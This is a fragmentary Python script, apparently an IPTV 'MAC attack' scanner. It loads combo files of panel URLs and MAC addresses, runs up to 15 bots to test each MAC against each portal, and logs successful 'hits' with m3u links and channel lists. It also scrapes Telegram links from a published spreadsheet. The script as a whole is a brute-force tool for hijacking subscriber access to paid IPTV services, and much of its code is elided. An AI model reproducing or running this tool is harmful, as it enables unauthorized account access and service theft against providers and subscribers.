...
url="https://docs.google.com/spreadsheets/d/e/2PACX-1vTsnGAinBTZv13UxgWxFgZlSmucnXnnci3-m0XyyhvSLgEXXXbvMrA5Qg6jLi0TbjMDVMEVyGeinRNG/pubhtml"
res=requests.get(url)
say=1
veri=str(res.text)
#print(veri)
for i in (veri).split('https://t.me/'):
	say =say +1
	if say >2:
		if 'dir="ltr">' in i:
			#print(i)
			ii=(i.split('</td></tr>')[0]) 
			li='https://t.me/'+ii.split('<')[0]
			yorum=ii.split('dir="ltr">')[1]
			if 'px">' in yorum:
				yorum=yorum.split('px">')[1]
				yorum=yorum.split('</div')[0]
yorum=yorum.replace("<br>","\n")
...
🔸🄲🄷🄰🄽🄽🄴🄻🔹🅅🄸🄴🅆 🔹🄲🄾🄽🅃🅁🄾🄻 🔸                  
\33[0m\33[1;44m
           𝔸𝕋𝕋𝔸ℂ𝕂 𝕊ℂ𝔸ℕ  𝕋𝕐ℙ𝔼        \33[0m           \33[0;1m""")
print(feyzo) 
kisacikti=""
...
print(feyzo) 
intro="""\33[33m
TWO SEPARATE COMBO FILES ARE REQUIRED FOR USE. 
1. PANEL LINKS 
2. MAC COMBO
MAKE SURE THAT YOUR PANEL COMBO FILE DOES NOT HAVE SIDE LINKS TO THE SAME PANEL. ALL PANELS IN THE PANEL LIST WILL BE SCANNED WITH THE MAC COMBO FILE."""
intro=intro+"""\33[0m
...
if "1"=="1":
 	...
 	print ("""Choose your PANEL list combo from the list!!!
"""+dsy+"""
\33[33m""" +str(say)+""" files found in your combo folder! choose your PANEL list combo from the list!!! Select a PANEL(link) combo list	""")
...
if "1"=="1":
 	...
 	for files in os.listdir (dir):
 		say=say+1
 		dsy=dsy+"	"+str(say)+"=⫸ "+files+'\n'
 	print ("""Choose your MAC combo from the list!!!
"""+dsy+"""
\33[33m""" +str(say)+""" files found in your combo folder! choose your MAC combo from the list!!! Select a MAC combo list	""")
 	dsyno=str(input(" \33[31mCombo No =\33[0m"))
 	say=0
 	...
 	if dsyno=="0":
 		...
 		mactur=input("Select the Mac type...\n Answer=")
 		if mactur=="":
 			mactur=14
 		#print(mactur)
...
botsay=0
botkac=input("""
   \33[1;96mType the Number of Bots....!\33[0m
   Write Count of Bots...! 
    \33[1;33mmax 15\33[0m
...
ᴡʜᴀᴛ ᴅᴏ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ꜱʜᴏᴡ ɪɴ ᴛʜᴇ ʀᴇꜱᴜʟᴛꜱ?

	0=⫸ᴄᴏɴɴᴇᴄᴛɪᴏɴ ᴅᴀᴛᴀ ᴏɴʟʏ
	1=⫸ᴄʜᴀɴɴᴇʟꜱ ᴏɴʟʏ
	2=⫸ꜱʜᴏᴡ ᴇᴠᴇʀʏᴛʜɪɴɢ (ʟɪᴠᴇ-ᴠᴏᴅ-ꜱᴇʀɪᴇꜱ)
...
def hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,panel):
	global hitr
	global hityaz
	try:
		imza="""
...
def echok(mac,bot,total,hitc,oran,tokenr,panel):
	...
	try:
		...
		echo=("""
╭➤ 🅟🅞🅦🅔🅡🌟🅐🅣🅣🅐🅒🅚🌟𝗣𝗬 𝗖𝗼𝗻𝗳𝗶𝗴 🇵🇰🅼🅱🅼🇵🇰     
├●  \33[0m\33[1;7mPanelLink ➤"""+str(panel)+"""  \33[0m 
		...
		if 'token' in veri:
			...
			if not id=="null":
			    ...
			    if not veri.count('phone')==0:
			     	...
			     	hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,panel)
